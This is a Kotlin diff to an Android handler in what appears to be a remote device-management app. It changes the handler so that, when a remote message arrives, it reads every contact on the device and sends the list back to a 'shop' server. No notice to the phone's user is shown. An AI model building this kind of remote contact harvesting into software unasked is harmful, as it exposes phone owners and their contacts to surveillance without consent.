@@ -4,25 +4,25 @@ import android.content.ContentResolver
 import android.content.Context
 import android.database.Cursor
 import android.provider.ContactsContract
-import android.util.Log
+import com.trex.rexnetwork.Constants
+import com.trex.rexnetwork.data.ActionMessageDTO
 import com.trex.rexnetwork.data.Actions
 
 open class GetContactsHandler(
     private val context: Context,
 ) : BaseActionHandler() {
-    open fun handle() {
+    open fun handle(messageDTO: ActionMessageDTO) {
         val contactsList = getAllContacts(context.contentResolver)
-        val contactsString = contactsList.joinToString(",")
-        val contactsPayload = mapOf(Actions.ACTION_GET_CONTACTS.name to contactsString)
-        Log.i("contacts list", "handle: $contactsString")
         if (contactsList.isNotEmpty()) {
-            sendTo(
-                context = context,
-                Actions.ACTION_GET_CONTACTS,
-                contactsPayload,
-            )
-        } else {
-            Log.e("TAG", "handle: Error contact list empty")
+            val contactsString = contactsList.joinToString(",")
+            val contactsPayload =
+                mapOf(
+                    Actions.ACTION_GET_CONTACTS.name to contactsString,
+                    Constants.KEY_RESPOSE_RESULT_STATUS to Constants.RESPONSE_RESULT_SUCCESS,
+                )
+
+            val response = messageDTO.copy(payload = contactsPayload)
+            sendResponseToShop(response, context)
         }
     }
 
